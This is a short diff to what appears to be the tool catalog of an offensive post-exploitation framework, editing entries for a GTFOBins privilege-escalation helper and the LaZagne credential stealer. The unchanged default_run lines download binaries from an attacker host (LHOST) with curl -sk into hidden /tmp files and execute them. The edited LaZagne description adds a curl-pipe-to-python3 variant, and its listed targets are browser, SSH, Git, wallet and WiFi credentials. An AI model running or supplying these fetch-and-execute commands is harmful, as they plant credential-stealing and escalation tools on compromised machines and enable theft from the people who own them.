@@ -59,7 +59,7 @@ LINUX_TOOL_CATALOG: dict[str, dict] = {
     "gtfo": {
         "paths": _lx("gtfo"),
         "category": "privesc",
-        "desc": "Offline GTFOBins CLI — instant escape/read/write recipes for any binary",
+        "desc": "Offline GTFOBins CLI — instant escape/read/write recipes for any binary (manual build: go install github.com/mzfr/gtfo@latest)",
         "delivery": "exec",
         "default_run": "curl -sk https://LHOST/gtfo -o /tmp/.gt && chmod +x /tmp/.gt && /tmp/.gt -n BINARY",
     },
@@ -89,7 +89,7 @@ LINUX_TOOL_CATALOG: dict[str, dict] = {
     "lazagne": {
         "paths": _lx("lazagne"),
         "category": "creds",
-        "desc": "Browser (Firefox/Chrome), SSH keys, Git, Wallet, WiFi creds",
+        "desc": "Browser/SSH/Git/Wallet creds — Python script; if Python3 on target: curl -sk https://LHOST/lazagne.py | python3",
         "delivery": "exec",
         "default_run": "curl -sk https://LHOST/lazagne -o /tmp/.lz && chmod +x /tmp/.lz && /tmp/.lz all",
     },
